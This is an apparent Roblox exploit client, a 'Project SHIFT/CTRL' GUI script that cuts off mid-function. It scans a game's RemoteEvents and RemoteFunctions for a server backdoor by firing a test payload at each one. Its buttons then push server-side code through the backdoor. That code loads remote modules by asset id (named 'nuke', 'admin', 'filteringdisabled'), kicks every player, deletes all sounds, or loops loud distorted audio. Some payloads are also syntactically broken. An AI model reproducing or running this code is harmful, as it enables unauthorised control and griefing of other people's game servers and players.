	tooltipFrame.BackgroundTransparency = 1
	tooltipFrame.BorderSizePixel = 0
	tooltipFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
	tooltipFrame.ScrollBarThickness = 4
	tooltipFrame.Visible = false
	tooltipFrame.ZIndex = 999
	tooltipFrame.ClipsDescendants = true
	tooltipFrame.Parent = screenGui
	
	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 2)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = tooltipFrame
	
	-- Keyword groups
	local keywordGroups = {
		[Color3.fromRGB(170, 0, 65)] = { "return", "function", "local", "if", "else", "error", "end", "elseif", "break" },
		[Color3.fromRGB(255, 255, 0)] = { ":Connect", ":IsA", ":FindFirstChild()", ":WaitForChild()", ":LoadCharacter()", "Clear()", "ClearAllChildren()" },
		[Color3.fromRGB(0, 85, 255)] = {
			"require", "game", "script", "print", "loadstring",
			"game.Workspace", "game.Players", "game.Lighting", "game.ReplicatedStorage", "game.ReplicatedFirst",
			"game.ServerScriptService", "game.ServerStorage", "game.StarterGui", "game.StarterPack", "game.StarterPlayer",
			"game.SoundService", "game.Chat", "game.LocalizationService", "game.MarketplaceService", "game.HttpService",
			"game.UserInputService", "game.ContextActionService", "game.RunService", "game.TweenService", "game.PathfindingService",
			"game.InsertService", "game.TestService", "game.VirtualInputManager", "game.VRService", "game.MessagingService",
			"game.NotificationService", "game.SocialService", "game.DataStoreService", "game.MemoryStoreService", "game.AssetService",
			"game.AdService", "game.AnalyticsService", "game.ScriptContext", "game.Selection", "game.GuiService", "game.InputService",
			"game.KeyframeSequenceProvider", "game.NavigationService", "game.Terrain", "game.Teams", "game.CollectionService",
			"game.ContentProvider", "game.Stats", "game.SoundscapeService", "game.ThumbnailGenerator", "game.TranslationService",
			"game.VoiceChatService", "game.ProximityPromptService", "game.TextChatService", "game.MaterialService",
			"game.FaceAnimatorService", "game.AnimationClipProvider", "game.AssetManagerService", "game.PluginDebugService",
			"game.StudioData", "game.StudioService", "game.SelectionService", "game.ToolboxService", "game.Draggers",
			"game.TemporaryScriptService"
		}
	}
	local memoryColor = Color3.fromRGB(158, 158, 158)
	
	local function clearTooltips()
		for _, child in ipairs(tooltipFrame:GetChildren()) do
			if child:IsA("GuiButton") then
				child:Destroy()
			end
		end
		tooltipFrame.Visible = false
	end
	
	local function createTooltip(text, color)
		local button = Instance.new("TextButton")
		button.Text = text
		button.BackgroundTransparency = 0.3
		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		button.TextColor3 = color
		button.Font = Enum.Font.SourceSans
		button.TextSize = 14
		button.Size = UDim2.new(1, 0, 0, 25)
		button.TextXAlignment = Enum.TextXAlignment.Left
		button.TextScaled = false
		button.AutoButtonColor = false
		button.Parent = tooltipFrame
		
		local stroke = Instance.new("UIStroke")
		stroke.Thickness = 1
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
		stroke.Parent = button
		
		button.MouseButton1Click:Connect(function()
			textBox.Text = text
			textBox.CursorPosition = #text + 1
			clearTooltips()
		end)
	end
	
	local function scanMemory(text)
		if text == "" then
			table.clear(memorizedKeywords)
			return
		end
		
		for var in string.gmatch(text, "local%s+([%w_]+)%s*=") do
			memorizedKeywords[var] = true
		end
		
		for func in string.gmatch(text, "local%s+function%s+([%w_]+)") do
			memorizedKeywords[func] = true
		end
		
		for name in pairs(memorizedKeywords) do
			if not string.find(text, name) then
				memorizedKeywords[name] = nil
			end
		end
	end
	
	local function isInsideDeclaration(text)
		local lines = string.split(text, "\n")
		local lastLine = lines[#lines] or ""
		
		if string.match(lastLine, "^%s*local%s+function%s+[%w_]*$") then return true end
		if string.match(lastLine, "^%s*local%s+[%w_]*$") then return true end
		if string.match(lastLine, "^%s*local%s+[%w_]+%s*=%s*$") then return true end
		
		return false
	end
	
	local function updateTooltip()
		local text = textBox.Text
		local lastWord = string.match(text, "[%w_:%.%(%)]+$")
		
		scanMemory(text)
		clearTooltips()
		
		if not lastWord or #lastWord == 0 or isInsideDeclaration(text) then
			return
		end
		
		local matches = {}
		
		for color, group in pairs(keywordGroups) do
			for _, keyword in pairs(group) do
				if string.sub(keyword, 1, #lastWord):lower() == lastWord:lower() and keyword:lower() ~= lastWord:lower() then
					table.insert(matches, { text = keyword, color = color })
				end
			end
		end
		
		for name in pairs(memorizedKeywords) do
			if string.sub(name, 1, #lastWord):lower() == lastWord:lower() and name:lower() ~= lastWord:lower() then
				table.insert(matches, { text = name, color = memoryColor })
			end
		end
		
		if #matches > 0 then
			for _, match in ipairs(matches) do
				createTooltip(match.text, match.color)
			end
			
			local caretPos = textBox.CursorPosition
			local textBeforeCaret = string.sub(textBox.Text, 1, caretPos - 1)
			local size = textBox.TextSize
			local font = textBox.Font
			
			local tempLabel = Instance.new("TextLabel")
			tempLabel.Text = textBeforeCaret
			tempLabel.Font = font
			tempLabel.TextSize = size
			tempLabel.Size = UDim2.new(0, 0, 0, 0)
			tempLabel.Visible = false
			tempLabel.Parent = screenGui
			
			runService.RenderStepped:Wait()
			local offsetX = tempLabel.TextBounds.X
			tempLabel:Destroy()
			
			local baseX = textBox.AbsolutePosition.X
			local baseY = textBox.AbsolutePosition.Y
			
			tooltipFrame.Position = UDim2.new(0, baseX + offsetX + 10, 0, baseY + textBox.AbsoluteSize.Y + 5)
			tooltipFrame.Visible = true
		else
			clearTooltips()
		end
	end
	
	textBox:GetPropertyChangedSignal("Text"):Connect(updateTooltip)
end;
task.spawn(C_21);
-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
local function C_22()
local script = G2L["22"];
	script.Parent.Text = 'print("Project SHIFT SS")'
end;
task.spawn(C_22);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_3d()
local script = G2L["3d"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(14125553864):Fire("' .. username .. '","c00lkidd")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_3d);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_41()
local script = G2L["41"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = ' require(14572394952)("' .. username .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_41);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_45()
local script = G2L["45"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(7192763922).load("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_45);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_49()
local script = G2L["49"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(15267263357).V11("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_49);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_4d()
local script = G2L["4d"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(78790302691160):Hload("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_4d);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_51()
local script = G2L["51"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(12350030542).RC7("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_51);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_55()
local script = G2L["55"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(17776365113).kj("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_55);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_59()
local script = G2L["59"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(135686792632620).nuke("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_59);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_5d()
local script = G2L["5d"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = [[local SoundService = game:GetService("SoundService")
		
	-- Sound IDs
		local soundIds = {
			82706813987936,
			76279547029713,
			135763933956435
		}
		
	-- Create and configure sounds
		local sounds = {}
		
	for _, id in ipairs(soundIds) do
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. id
		sound.Volume = 10
		sound.PlaybackSpeed = 0.2
			
	-- Add distortion effect (level 0.9)
		local distortion = Instance.new("DistortionSoundEffect")
		distortion.Level = 0.5
		distortion.Parent = sound
			
		sound.Parent = SoundService
		table.insert(sounds, sound)
	end
		
	-- Function to play sounds in sequence
		local function playSequence()
			while true do
				for _, sound in ipairs(sounds) do
					sound:Play()
					sound.Ended:Wait()
				end
			end
		end
		
	-- Start the loop
	playSequence()
	]]
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_5d);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_61()
local script = G2L["61"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(7634392335)("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_61);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_65()
local script = G2L["65"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(75026282232818).load("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_65);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_69()
local script = G2L["69"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(70681531110549).admin("' .. game.Players.LocalPlayer.Name .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_69);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_6d()
local script = G2L["6d"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(10304477576).AntiSkid()'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_6d);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_71()
local script = G2L["71"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = [[for _, obj in ipairs(game:GetDescendants()) do
		if obj:IsA("Sound") then
		obj:Destroy()
		end
		end
		]]
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_71);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_75()
local script = G2L["75"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = [[for i,v player in ipairs(game.Players:GetDescendants()) do
		v:Kick("This server has been shut down")
		end
		]]
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_75);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_79()
local script = G2L["79"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(9978015219).filteringdisabled("' .. username .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_79);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_7d()
local script = G2L["7d"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = ' require(14499140823)("' .. username .. '", "sorcerer")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_7d);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_81()
local script = G2L["81"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(2823974237).giveGuns' .. username .. ''
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_81);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_85()
local script = G2L["85"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(104732504345735).jumpscare("' .. username .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_85);
-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
local function C_89()
local script = G2L["89"];
	local players = game:GetService("Players")
	local starterGui = game:GetService("StarterGui")
	local username = players.LocalPlayer.Name
	
	script.Parent.MouseButton1Click:Connect(function()
		local backdoor = getgenv().confirmedBackdoor
		local backdoorType = getgenv().confirmedType
		
		if not backdoor then
			pcall(function()
				starterGui:SetCore("SendNotification", {
					Title = "Project CTRL",
					Text = "Inject first before executing!",
					Duration = 5
				})
			end)
			return
		end
		
		local rawcode = 'require(104712588684071)("' .. username .. '")'
		
		pcall(function()
			if backdoorType == "RemoteEvent" then
				backdoor:FireServer(rawcode)
			elseif backdoorType == "RemoteFunction" then
				backdoor:InvokeServer(rawcode)
			end
			
			starterGui:SetCore("SendNotification", {
				Title = "Project CTRL",
				Text = "Script executed successfully!",
				Duration = 5
			})
		end)
	end)
end;
task.spawn(C_89);
-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
local function C_8c()
local script = G2L["8c"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.page1.Visible = true
		script.Parent.Parent.page2.Visible = false
		script.Parent.Parent.page3.Visible = false
		script.Parent.Parent.page4.Visible = false
	end)
end;
task.spawn(C_8c);
-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
local function C_8f()
local script = G2L["8f"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.page1.Visible = false
		script.Parent.Parent.page2.Visible = true
		script.Parent.Parent.page3.Visible = false
		script.Parent.Parent.page4.Visible = false
	end)
end;
task.spawn(C_8f);
-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
local function C_92()
local script = G2L["92"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.page1.Visible = false
		script.Parent.Parent.page2.Visible = false
		script.Parent.Parent.page3.Visible = true
		script.Parent.Parent.page4.Visible = false
	end)
end;
task.spawn(C_92);
-- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.LocalScript
local function C_95()
local script = G2L["95"];
	local scrollingFrame = script.Parent
	local LogService = game:GetService("LogService")
	
	-- Format time
	local function getTimeStamp()
		local t = os.date("*t")
		return string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
	end
	
	-- Create a new label for each log line
	local function addLogLine(text, color)
		local label = Instance.new("TextLabel")
		label.Name = "LOG"
		label.Text = text
		label.TextColor3 = color
		label.BackgroundTransparency = 1
		label.Font = Enum.Font.Code
		label.TextSize = 14
		label.TextWrapped = true
		label.Size = UDim2.new(1, -10, 0, 0)
		label.AutomaticSize = Enum.AutomaticSize.Y
		label.Parent = scrollingFrame
		
		-- Apply default UIStroke
		local stroke = Instance.new("UIStroke")
		stroke.Parent = label
	end
	
	-- Listen to all console output
	LogService.MessageOut:Connect(function(message, messageType)
		if message == "Hello world!" then return end -- ⛔ Skip exact match
		
		local timestamp = getTimeStamp()
		local color = Color3.fromRGB(255, 255, 255)
		
		if messageType == Enum.MessageType.MessageWarning then
			color = Color3.fromRGB(255, 217, 0)
		elseif messageType == Enum.MessageType.MessageError then
			color = Color3.fromRGB(179, 0, 0)
		end
		
		local fullText = "[" .. timestamp .. "] " .. message
		addLogLine(fullText, color)
	end)
end;
task.spawn(C_95);
-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
local function C_98()
local script = G2L["98"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.page1.Visible = false
		script.Parent.Parent.page2.Visible = false
		script.Parent.Parent.page3.Visible = false
		script.Parent.Parent.page4.Visible = true
	end)
end;
task.spawn(C_98);
-- StarterGui.ScreenGui.Scanner
local function C_99()
local script = G2L["99"];
	local replicatedStorage = game:GetService("ReplicatedStorage")
	local starterGui = game:GetService("StarterGui")
	local players = game:GetService("Players")
	local screenGui = script.Parent
	local frame = screenGui:FindFirstChildOfClass("Frame"):FindFirstChild("page2")
	local username = players.LocalPlayer.Name
	
	-- GUI references inside Frame
	local textbox = frame:FindFirstChild("Text"):FindFirstChild("TextBox")
	local executeButton = frame:FindFirstChild("Execute")
	local clearButton = frame:FindFirstChild("Clear")
	local injectButton = frame:FindFirstChild("Inject")
	local r6Button = frame:FindFirstChild("R6")
	local statusLabel = script.Parent.Frame.page1.Status
	
	if not textbox or not executeButton or not clearButton or not injectButton or not r6Button or not statusLabel then
		warn("Missing GUI components.")
		return
	end
	
	-- Global storage using getgenv()
	getgenv().confirmedBackdoor = nil
	getgenv().confirmedType = nil
	
	injectButton.MouseButton1Click:Connect(function()
		local testPayload = 'local h = Instance.new("Hint") h.Parent = game.Workspace h.Text = "project SHIFT X |BEST serverside and BACKDOOR scanner"'
		local found = false
		
		for _, obj in ipairs(replicatedStorage:GetDescendants()) do
			if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
				for _, h in ipairs(workspace:GetChildren()) do
					if h:IsA("Hint") and h.Text == "project SHIFT X |BEST serverside and BACKDOOR scanner" then
						h:Destroy()
					end
				end
				
				pcall(function()
					if obj:IsA("RemoteEvent") then
						obj:FireServer(testPayload)
					elseif obj:IsA("RemoteFunction") then
						obj:InvokeServer(testPayload)
					end
				end)
				
				wait(0.5)
				
				for _, h in ipairs(workspace:GetChildren()) do
					if h:IsA("Hint") and h.Text == "project SHIFT X |BEST serverside and BACKDOOR scanner" then
